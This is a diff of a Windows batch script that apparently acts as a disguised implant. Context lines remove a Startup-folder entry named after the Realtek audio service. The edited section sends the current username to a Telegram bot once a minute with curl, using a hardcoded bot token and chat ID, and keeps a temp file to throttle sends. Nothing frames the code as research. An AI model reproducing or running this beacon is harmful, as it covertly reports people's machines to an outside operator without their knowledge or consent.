@@ -421,7 +421,13 @@ del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUServic
 
 echo Operation completed.
 
-goto CONT
+::goto CONT
+
+
+
+
+
+
 
 
 
@@ -438,21 +444,22 @@ set "LAST_MIN_SENT_FILE=%temp%\lstminsnt.txt"
 
 
 
-
 if exist "%LAST_MIN_SENT_FILE%" (
-    set /p LAST_MINUTE=<"%LAST_MIN_SENT_FILE%"
+    set /p LAST_MINUTE_SENT=<"%LAST_MIN_SENT_FILE%"
 ) else (
-    set "LAST_MINUTE=none"
+    set "LAST_MINUTE_SENT=none"
 )
+
+
 
 set "currentMinute1=%time:~3,2%"
 
 
-if "%LAST_MINUTE%"=="%currentMinute1%" (
+
+if "%LAST_MINUTE_SENT%"=="%currentMinute1%" (
+    echo Skipping Sending
     goto CONT
 )
-
-
 
 
 
@@ -468,7 +475,7 @@ if "%LAST_MINUTE%"=="%currentMinute1%" (
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%|RUNNING...............|"
+set "MESSAGEEVERY=%USERNAME%|RUNNING.....|"
 
 
 :: URL encode the message by replacing spaces with %20
@@ -480,10 +487,9 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
      -d "text=%ENCODED_MESSAGE%"
 
 echo Message sent to chat ID %CHAT_ID%
+echo %currentMinute1%> "%LAST_MIN_SENT_FILE%"
 
 
-
-echo %currentMinute1% > "%LAST_MIN_SENT_FILE%"
 
 
 
@@ -492,6 +498,14 @@ echo %currentMinute1% > "%LAST_MIN_SENT_FILE%"
 
 
 :CONT
+
+
+
+
+
+
+
+
 
 
 
